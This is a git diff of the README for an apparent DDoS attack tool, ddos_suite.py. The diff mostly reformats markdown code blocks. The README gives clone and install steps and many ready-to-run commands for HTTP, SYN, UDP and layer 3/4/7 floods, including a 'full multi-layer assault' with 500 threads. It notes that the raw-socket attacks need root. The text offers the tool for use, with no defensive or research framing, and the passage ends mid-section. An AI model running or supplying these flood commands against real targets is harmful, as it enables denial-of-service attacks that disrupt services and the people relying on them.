@@ -54,81 +54,100 @@ Covers **Layer 3 (Network)**, **Layer 4 (Transport)**, and **Layer 7 (Applicatio
 
 ```bash
 git clone https://github.com/Hacker00X1/ddos-attack.git
+```
+```bash
 cd ddos-attack
 ```
 
 # Install Python dependencies
+
+```bash
 pip install scapy
+```
 ⚠️ Note: Layer 3 and Layer 4 attacks require root/administrator privileges for raw socket operations. Use sudo on Linux.
 
 🎯 Quick Start
-bash
-
-
-
-# Basic HTTP flood (30 seconds, 100 threads)
+Basic HTTP flood (30 seconds, 100 threads)
+```bash
 python3 ddos_suite.py http://target.com
+```
 
-# Full multi-layer assault (60 seconds, 500 threads)
+Full multi-layer assault (60 seconds, 500 threads)
+```bash
 sudo python3 ddos_suite.py https://target.com -a full -d 60 -t 500
+```
 
-# List all available attack modules
+List all available attack modules
+```bash
 python3 ddos_suite.py --list
+```
+
+
 📖 Usage
-
-
-
+```bash
 python3 ddos_suite.py <target> [options]
-Arguments
+```
 
-
-Argument	Description
+## Arguments
+Argument	Description:
+```bash
 target	Target URL (e.g., http://example.com) or IP address (e.g., 192.168.1.100)
-Options
+```
 
-
+# Options:
 Flag	Default	Description
+```bash
 -a, --attack	http_flood	Attack type — see Attack Modules
+```
+```bash
 -d, --duration	30	Duration of the attack in seconds
+```
+```bash
 -t, --threads	100	Number of concurrent worker threads
+```
+```bash
 --port	80	Target port (required for IP targets)
+```
+```bash
 --list	—	Display all available attack modules
-Examples
+```
+
+# Examples:
 🔹 Basic Single Attack
-bash
 
-
-
-# Default: HTTP flood, 30s, 100 threads
+Default: HTTP flood, 30s, 100 threads
+```bash
 python3 ddos_suite.py http://target.com
+```
+
 🔹 Custom Attack with Options
-bash
-
-
-
-# SYN flood for 60 seconds using 200 threads
+SYN flood for 60 seconds using 200 threads
+```bash
 python3 ddos_suite.py http://target.com -a syn_flood -d 60 -t 200
+```
 
-# UDP flood against an IP target on port 443
+UDP flood against an IP target on port 443
+```bash
 sudo python3 ddos_suite.py 192.168.1.100 -a udp_flood -d 30 --port 443
+```
+
 🔹 Layer-Specific Assaults
-bash
-
-
-
-# Run ALL Layer 3 (Network) attacks simultaneously
+Run ALL Layer 3 (Network) attacks simultaneously
+```bash
 sudo python3 ddos_suite.py http://target.com -a layer3 -d 30
+```
 
-# Run ALL Layer 4 (Transport) attacks simultaneously
+Run ALL Layer 4 (Transport) attacks simultaneously
+```bash
 sudo python3 ddos_suite.py http://target.com -a layer4 -d 60 -t 300
+```
 
-# Run ALL Layer 7 (Application) attacks simultaneously
+Run ALL Layer 7 (Application) attacks simultaneously
+```bash
 python3 ddos_suite.py http://target.com -a layer7 -d 45
+```
+
 🔹 Full Multi-Layer Assault
-bash
-
-
-
 # ALL layers at once — the full arsenal
 sudo python3 ddos_suite.py https://target.com -a full -d 60 -t 500
 🔹 Sequential All Attacks
